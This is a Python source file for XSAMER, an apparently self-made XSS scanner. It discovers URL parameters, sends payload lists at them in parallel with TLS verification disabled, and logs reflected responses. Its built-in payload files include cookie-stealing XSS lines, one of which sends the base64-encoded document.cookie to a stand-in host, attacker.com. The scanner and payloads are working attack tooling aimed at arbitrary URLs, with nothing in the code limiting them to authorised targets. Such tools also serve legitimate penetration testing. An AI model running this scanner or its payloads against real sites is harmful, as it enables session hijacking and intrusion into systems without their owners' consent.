#!/usr/bin/env python3
import requests
import json
import time
import argparse
import sys
import os
import glob
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
import signal

def show_banner():
    """Display XSAMER banner"""
    print("""
██╗  ██╗███████╗ █████╗ ███╗   ███╗███████╗██████╗ 
╚██╗██╔╝██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗
 ╚███╔╝ ███████╗███████║██╔████╔██║█████╗  ██████╔╝
 ██╔██╗ ╚════██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██╔╝ ██╗███████║██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                    
    """)


class XSSTester:
    def __init__(self):
        self.payloads_file = "xss_payloads.json"
        self.results_file = "xsamer_result.txt"
        self.progress_file = "xsamer_progress.json"
        self.payloads_dir = "payloads"
        self.urls_file = "urls.txt"
        self.verbose = False
        self.threads = 10
        self.pause_event = threading.Event()
        self.scanning = False
        self.vulnerable_results = []
        self.status_filter = None
        self.load_payloads()
        
    def load_payloads(self):
        """Load ALL payloads from .txt files in payloads directory"""
        os.makedirs(self.payloads_dir, exist_ok=True)
        self.payloads = {}
        self.load_payloads_from_files()
        
        if not self.payloads:
            self.create_default_payloads()
    
    def create_default_payloads(self):
        """Create default payload files if none exist"""
        default_payloads = {
            "basic_xss.txt": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "\"><svg onload=alert(1)>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>"
            ],
            "advanced_xss.txt": [
                "<script>fetch('/steal?cookie='+document.cookie)</script>",
                "<img src=x onerror=\"fetch('http://attacker.com/?c='+btoa(document.cookie))\">",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<object data=\"javascript:alert('XSS')\">"
            ],
            "dom_xss.txt": [
                "#<img src=x onerror=alert(1)>",
                "javascript:alert('DOM-XSS')",
                "#\" onmouseover=\"alert(1)"
            ]
        }
        
        for filename, payloads in default_payloads.items():
            filepath = os.path.join(self.payloads_dir, filename)
            with open(filepath, 'w') as f:
                f.write("# " + filename + "\n")
                for payload in payloads:
                    f.write(payload + "\n")
            print(f"[+] Created {filename} with {len(payloads)} payloads")
        
        self.load_payloads_from_files()
    
    def load_payloads_from_files(self):
        """Load ALL payloads from ALL .txt files in payloads directory"""
        txt_files = glob.glob(os.path.join(self.payloads_dir, "*.txt"))
        
        if not txt_files:
            return
        
        for file_path in txt_files:
            category_name = os.path.splitext(os.path.basename(file_path))[0]
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                if payloads:
                    self.payloads[category_name] = payloads
            
            except Exception as e:
                print(f"[-] Error loading {file_path}: {e}")
    
    def get_all_payloads(self):
        """Get ALL payloads from ALL .txt files"""
        all_payloads = []
        for category, payloads in self.payloads.items():
            all_payloads.extend(payloads)
        return all_payloads
    
    def discover_parameters(self, url, methods=['GET']):
        """Discover parameters from URL and common parameter lists"""
        print(f"\n🎯 Discovering parameters...", end="", flush=True)
        
        discovered_params = set()
        
        # Extract parameters from URL query string
        parsed = urlparse(url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            discovered_params.update(query_params.keys())
        
        # Common parameters to test
        common_params = [
            'q', 'search', 'query', 'id', 'page', 'name', 'email', 'user', 'username',
            'password', 'redirect', 'url', 'return', 'next', 'file', 'path', 'dir',
            'category', 'type', 'view', 'template', 'cmd', 'command', 'exec',
            'code', 'filter', 'sort', 'order', 'limit', 'offset', 'callback',
            'jsonp', 'func', 'function', 'action', 'do', 'process', 'submit'
        ]
        
        discovered_params.update(common_params)
        
        # Test each parameter with a simple request
        test_params = list(discovered_params)[:20]
        
        valid_params = set()
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        def test_param(param):
            try:
                test_url = f"{url}?{param}=test"
                response = requests.get(test_url, headers=headers, timeout=5, verify=False)
                
                if response.status_code < 500:
                    return param
            except:
                pass
            return None
        
        # Test parameters with threading
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test_param, param) for param in test_params]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    valid_params.add(result)
        
        print(f" found {len(valid_params)} parameters")
        
        return list(valid_params)
    
    def load_urls_from_file(self, file_path):
        """Load URLs from a text file"""
        if not os.path.exists(file_path):
            print(f"[-] URLs file not found: {file_path}")
            return []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            valid_urls = []
            for url in urls:
                if url.startswith(('http://', 'https://')):
                    valid_urls.append(url)
                else:
                    valid_urls.append('https://' + url)
            
            print(f"[+] Loaded {len(valid_urls)} URLs from {file_path}")
            return valid_urls
            
        except Exception as e:
            print(f"[-] Error loading URLs from {file_path}: {e}")
            return []
    
    def save_progress(self, current_state):
        """Save scan progress to file"""
        try:
            with open(self.progress_file, 'w') as f:
                json.dump(current_state, f, indent=2)
        except:
            pass
    
    def load_progress(self):
        """Load scan progress from file"""
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return None
    
    def save_vulnerable_results(self):
        """Save ONLY vulnerable results to file"""
        if not self.vulnerable_results:
            print("[-] No vulnerable results to save")
            return
        
        try:
            with open(self.results_file, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("XSAMER - XSS VULNERABILITY SCAN RESULTS\n")
                f.write("=" * 80 + "\n")
                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Vulnerabilities Found: {len(self.vulnerable_results)}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, vuln in enumerate(self.vulnerable_results, 1):
                    f.write(f"VULNERABILITY #{i}\n")
                    f.write(f"URL: {vuln['test_url']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"Method: {vuln['method']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Reflection Points: {', '.join(vuln['reflection_points'])}\n")
                    f.write(f"Status Code: {vuln['status_code']}\n")
                    f.write("-" * 80 + "\n\n")
            
            print(f"[+] Vulnerable results saved to: {self.results_file}")
            print(f"[+] Total vulnerabilities recorded: {len(self.vulnerable_results)}")
            
        except Exception as e:
            print(f"[-] Error saving results: {e}")
    
    def get_status_color(self, status_code):
        """Get color for status code"""
        if 200 <= status_code < 300:
            return "🟢"
        elif 300 <= status_code < 400:
            return "🟡"
        elif 400 <= status_code < 500:
            return "🔴"
        elif 500 <= status_code < 600:
            return "🟣"
        else:
            return "⚪"
    
    def should_show_result(self, status_code):
        """Check if result should be shown based on status filter"""
        if self.status_filter is None:
            # Default: show only reflected payloads
            return False
        
        # Convert status filter to range
        if self.status_filter == 200:
            return 200 <= status_code < 300
        elif self.status_filter == 300:
            return 300 <= status_code < 400
        elif self.status_filter == 400:
            return 400 <= status_code < 500
        elif self.status_filter == 500:
            return 500 <= status_code < 600
        else:
            return status_code == self.status_filter
    
    def test_single_payload(self, url, payload, method, param):
        """Test a single payload (thread-safe)"""
        if self.pause_event.is_set():
            return None
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        try:
            if method.upper() == "GET":
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
            
            reflection_points = self.check_reflection(response.text, payload)
            
            result = {
                'url': url,
                'test_url': test_url if method.upper() == "GET" else url,
                'payload': payload,
                'method': method,
                'parameter': param,
                'status_code': response.status_code,
                'reflected': len(reflection_points) > 0,
                'reflection_points': reflection_points,
                'content_length': len(response.text),
                'error': False
            }
            
            return result
            
        except Exception as e:
            return {
                'url': url,
                'payload': payload,
                'error': True,
                'error_message': str(e)
            }
    
    def check_reflection(self, content, payload):
        """Check where the payload is reflected in the response"""
        reflection_points = []
        
        if payload in content:
            reflection_points.append("raw")
        
        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if encoded_payload in content:
            reflection_points.append("html_encoded")
        
        if f'"{payload}"' in content:
            reflection_points.append("in_quotes")
        
        if f"> {payload}" in content or f"{payload} <" in content:
            reflection_points.append("in_text")
        
        for char in ['<', '>', '"', "'"]:
            if char in payload and char in content:
                reflection_points.append(f"contains_{char}")
        
        return reflection_points
    
    def scan_website(self, target_url, methods=None, parameters=None, resume=False):
        """Perform comprehensive XSS scanning with ALL payloads"""
        # Always use ALL payloads from ALL .txt files
        payloads_to_use = self.get_all_payloads()
        
        if methods is None:
            methods = ['GET']
        
        # Auto-discover parameters if not provided
        if parameters is None:
            parameters = self.discover_parameters(target_url, methods)
        
        # Display scan information
        print(f"\n🎯 Target: {target_url}")
        print(f"📂 Payload Files: {len(self.payloads)}")
        print(f"📦 Total Payloads: {len(payloads_to_use)}")
        print(f"🔧 Methods: {', '.join(methods)}")
        print(f"📝 Parameters: {len(parameters)}")
        print(f"🚀 Threads: {self.threads}")
        
        # Prepare all test combinations
        all_tests = []
        for payload in payloads_to_use:
            for method in methods:
                for param in parameters:
                    all_tests.append((payload, method, param))
        
        total_tests = len(all_tests)
        print(f"📈 Total Tests: {total_tests}")
        print(f"⏰ Start Time: {time.strftime('%H:%M:%S')}")
        
        # Show filter information
        if self.status_filter is None:
            print("🔍 Filter: REFLECTED PAYLOADS ONLY")
        else:
            print(f"🔍 Filter: STATUS CODE {self.status_filter} ONLY")
        
        print("\n" + "="*50)
        print("💡 Press Ctrl+C to pause")
        print("="*50 + "\n")
        
        # Resume functionality
        start_index = 0
        if resume:
            progress = self.load_progress()
            if progress and progress.get('url') == target_url:
                start_index = progress.get('current_test', 0)
                print(f"[+] Resuming from test {start_index + 1}/{total_tests}")
        
        vulnerabilities_found = 0
        completed_tests = 0
        
        self.scanning = True
        self.pause_event.clear()
        
        def worker(test_info):
            if self.pause_event.is_set():
                return None
            payload, method, param = test_info
            return self.test_single_payload(target_url, payload, method, param)
        
        # Progress monitoring thread
        def monitor_progress():
            while self.scanning and completed_tests < total_tests:
                if not self.pause_event.is_set():
                    current_state = {
                        'url': target_url,
                        'current_test': completed_tests,
                        'total_tests': total_tests,
                        'vulnerabilities': vulnerabilities_found,
                        'timestamp': time.time()
                    }
                    self.save_progress(current_state)
                time.sleep(10)
        
        # Start progress monitor
        progress_thread = threading.Thread(target=monitor_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                # Submit all tests
                future_to_test = {executor.submit(worker, test): test for test in all_tests[start_index:]}
                
                for future in as_completed(future_to_test):
                    if self.pause_event.is_set():
                        break
                        
                    test = future_to_test[future]
                    payload, method, param = test
                    completed_tests += 1
                    
                    try:
                        result = future.result()
                        if result and not result.get('error'):
                            status_code = result['status_code']
                            
                            # Check if we should show this result based on filter
                            should_show = False
                            show_reason = ""
                            
                            if self.status_filter is None:
                                # Default: show only reflected payloads
                                should_show = result.get('reflected')
                                show_reason = "REFLECTED"
                            else:
                                # Show based on status code filter
                                should_show = self.should_show_result(status_code)
                                show_reason = f"STATUS {self.status_filter}"
                            
                            if should_show:
                                status_color = self.get_status_color(status_code)
                                payloads_left = total_tests - completed_tests
                                
                                print(f"📡 {show_reason} PAYLOAD")
                                print(f"   📍 Status: {status_color} {status_code}")
                                print(f"   🔧 Parameter: {param}")
                                print(f"   📦 Payload: {result['payload']}")
                                
                                if result.get('reflected'):
                                    print(f"   🔄 Reflection: {', '.join(result['reflection_points'])}")
                                    vulnerabilities_found += 1
                                    self.vulnerable_results.append(result)
                                
                                print(f"   🌐 URL: {result['test_url']}")
                                print(f"   📊 Payloads left: {payloads_left}")
                                print("   " + "-" * 50)
                    
                    except Exception as e:
                        # Only show errors in verbose mode
                        if self.verbose:
                            print(f"[-] Error in test: {e}")
                    
                    # Show progress every 25 tests
                    if completed_tests % 25 == 0:
                        payloads_left = total_tests - completed_tests
                        progress_percent = (completed_tests / total_tests) * 100
                        filter_info = ""
                        if self.status_filter is None:
                            filter_info = f" | Reflected: {vulnerabilities_found}"
                        else:
                            filter_info = f" | Status {self.status_filter}"
                        
                        print(f"\r[*] Progress: {completed_tests}/{total_tests} ({progress_percent:.1f}%) | Payloads left: {payloads_left}{filter_info}", end="", flush=True)
            
        except KeyboardInterrupt:
            payloads_left = total_tests - completed_tests
            print(f"\n\n⏸️  Scan paused!")
            print(f"📊 Completed: {completed_tests}/{total_tests}")
            print(f"📦 Payloads left: {payloads_left}")
            if self.status_filter is None:
                print(f"🚨 Reflected payloads: {vulnerabilities_found}")
            else:
                print(f"📡 Status {self.status_filter} payloads shown")
            print("💡 Use 'xsamer --resume' to continue")
            self.pause_event.set()
            return vulnerabilities_found, True
        
        self.scanning = False
        
        print(f"\n\n✅ Scan Completed!")
        print(f"📊 Total Tests: {total_tests}")
        if self.status_filter is None:
            print(f"🚨 Reflected Payloads Found: {vulnerabilities_found}")
        else:
            print(f"📡 Status {self.status_filter} Payloads Shown")
        print(f"⏰ End Time: {time.strftime('%H:%M:%S')}")
        
        return vulnerabilities_found, False
    
    def resume_scan(self):
        """Resume a paused scan"""
        progress = self.load_progress()
        if not progress:
            print("[-] No progress file found to resume")
            return None, 0
        
        print(f"[+] Resuming scan for: {progress['url']}")
        print(f"[+] Previous progress: {progress['current_test']}/{progress['total_tests']} tests")
        print(f"[+] Payloads left: {progress['total_tests'] - progress['current_test']}")
        print(f"[+] Reflected payloads found: {progress.get('vulnerabilities', 0)}")
        
        return progress['url'], progress.get('vulnerabilities', 0)
    
    def show_payload_summary(self):
        """Show summary of available payloads"""
        print("\n📁 PAYLOAD FILES SUMMARY:")
        print("=" * 40)
        total_payloads = 0
        for category, payloads in self.payloads.items():
            print(f"  {category}: {len(payloads)} payloads")
            total_payloads += len(payloads)
        print(f"\n📊 Total: {total_payloads} payloads from {len(self.payloads)} files")
        print("\n💡 All payloads will be tested during scanning")


def signal_handler(sig, frame):
    """Handle Ctrl+C for graceful pause"""
    print("\n\n⏸️  Pause signal received...")


def main():
    # Show banner when no arguments provided
    if len(sys.argv) == 1:
        show_banner()
        print("👋 Welcome to XSS Scanner by Samer EL HAGE")
        print("=" * 50)
        print("Usage: xsamer [OPTIONS]")
        print("\nQuick Start:")
        print("  xsamer -u https://example.com        # Default: reflected only")
        print("  xsamer -u https://example.com --r200 # Show only 200 status")
        print("  xsamer -u https://example.com --r300 # Show only 300 status") 
        print("  xsamer -u https://example.com --r400 # Show only 400 status")
        print("  xsamer -u https://example.com --r500 # Show only 500 status")
        print("  xsamer -u https://example.com -t 20  # Fast scan with 20 threads")
        print("  xsamer --resume                      # Resume paused scan")
        print("  xsamer --show                        # Show payload files")
        print("\n💡 Default: Shows only REFLECTED payloads")
        print("💡 Use --r200, --r300, --r400, --r500 to filter by status code")
        return

    # Set up signal handler for pause
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='🚀 XSAMER - Advanced XSS Scanner Tool', 
                                   usage='xsamer [OPTIONS]')
    
    # Main scanning options
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-l', '--list', dest='urls_file', help='File containing list of URLs to scan')
    parser.add_argument('--resume', action='store_true', help='Resume paused scan')
    
    # Status code filters (fixed with proper argument names)
    parser.add_argument('--r200', action='store_true', help='Show only 200 status codes')
    parser.add_argument('--r300', action='store_true', help='Show only 300 status codes')
    parser.add_argument('--r400', action='store_true', help='Show only 400 status codes')
    parser.add_argument('--r500', action='store_true', help='Show only 500 status codes')
    
    # Performance options
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    # Payload and scanning options
    parser.add_argument('-p', '--params', nargs='+', help='Specific parameters to test (auto-discover if not provided)')
    parser.add_argument('-m', '--methods', nargs='+', default=['GET'], help='HTTP methods to test (default: GET)')
    
    # Information options
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (shows errors)')
    parser.add_argument('--show', action='store_true', help='Show all available payload files')
    
    args = parser.parse_args()
    scanner = XSSTester()
    scanner.verbose = args.verbose
    scanner.threads = args.threads
    
    # Set status code filter (fixed argument access)
    if args.r200:
        scanner.status_filter = 200
    elif args.r300:
        scanner.status_filter = 300
    elif args.r400:
        scanner.status_filter = 400
    elif args.r500:
        scanner.status_filter = 500
    else:
        scanner.status_filter = None  # Default: reflected only
    
    # Show payload files
    if args.show:
        scanner.show_payload_summary()
        return
    
    # Resume scan
    if args.resume:
        target_url, previous_vulns = scanner.resume_scan()
        if target_url:
            args.url = target_url
    
    # Determine URLs to scan
    urls_to_scan = []
    
    if args.urls_file:
        urls_to_scan = scanner.load_urls_from_file(args.urls_file)
        if not urls_to_scan:
            print("[-] No valid URLs found to scan")
            return
    elif args.url:
        url = args.url
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        urls_to_scan = [url]
    else:
        if os.path.exists('urls.txt'):
            urls_to_scan = scanner.load_urls_from_file('urls.txt')
            if not urls_to_scan:
                print("[-] No valid URLs found in urls.txt")
                return
        else:
            print("[-] Please provide a URL using -u or URL list using -l")
            parser.print_help()
            return
    
    # Show scanning info
    total_payloads = len(scanner.get_all_payloads())
    print(f"\n🚀 XSAMER SCANNER STARTED")
    print("=" * 50)
    print(f"[+] Target URLs: {len(urls_to_scan)}")
    print(f"[+] Payload Files: {len(scanner.payloads)}")
    print(f"[+] Total Payloads: {total_payloads}")
    print(f"[+] Threads: {scanner.threads}")
    
    if scanner.status_filter is None:
        print(f"[+] Output: REFLECTED PAYLOADS ONLY")
    else:
        print(f"[+] Output: STATUS CODE {scanner.status_filter} ONLY")
    
    # Perform scanning
    total_vulnerabilities = 0
    
    for url in urls_to_scan:
        vuln_count, was_paused = scanner.scan_website(
            url, 
            methods=args.methods,
            parameters=args.params,
            resume=args.resume
        )
        
        total_vulnerabilities += vuln_count
        
        if was_paused:
            break
        
        # Brief pause between URLs
        if len(urls_to_scan) > 1:
            time.sleep(1)
    
    # Save vulnerable results
    if not scanner.pause_event.is_set():
        scanner.save_vulnerable_results()
        
        # Clean up progress file if scan completed
        if os.path.exists(scanner.progress_file):
            os.remove(scanner.progress_file)

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
